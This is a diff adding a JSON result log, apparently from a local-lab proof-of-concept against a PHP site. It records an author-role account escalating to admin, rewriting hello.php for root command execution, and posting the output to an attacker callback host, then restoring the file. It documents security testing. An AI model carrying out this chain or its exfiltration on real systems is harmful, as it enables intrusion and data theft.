@@ -1,0 +1,37 @@
+{
+  "target": "http://127.0.0.1:18080",
+  "scope": "LOCAL LAB ONLY",
+  "proof": "attacker-driven command exec + outbound exfil to attacker host",
+  "callback": "http://172.19.0.1:9099",
+  "hello_php_sha256_before": "1244904e04a09c848d6e776ffecd98325ec613f277578abf3cb98c6b6d58fe53",
+  "author": {
+    "uid": 4,
+    "roles": [
+      "author"
+    ]
+  },
+  "post": {
+    "id": 963,
+    "http": 201,
+    "status": "publish"
+  },
+  "admin_login": true,
+  "rce_state": {
+    "s": "done",
+    "save": 200,
+    "done": true
+  },
+  "hello_php_sha256_after_write": "4b461219f904c073602ac9668a8ac09dfad7a020253105ad5df89246b414536c",
+  "cmd_http": {
+    "status": 200,
+    "output": "uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\ncb722bffb922\nLinux 6.6.87.2-microsoft-standard-WSL2 x86_64 Linux\n"
+  },
+  "exfil_trigger": {
+    "status": 200,
+    "output": "ok"
+  },
+  "c2_log": "2026-10-13T06:10:49.694163Z POST /exfil from 172.19.0.3 UA=curl/8.22.0\n  BODY: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\ncb722bffb922\nLinux 6.6.87.2-microsoft-standard-WSL2 x86_64 Linux\n",
+  "hello_php_sha256_restored": "1244904e04a09c848d6e776ffecd98325ec613f277578abf3cb98c6b6d58fe53",
+  "restored_ok": true,
+  "post_deleted": true
+}
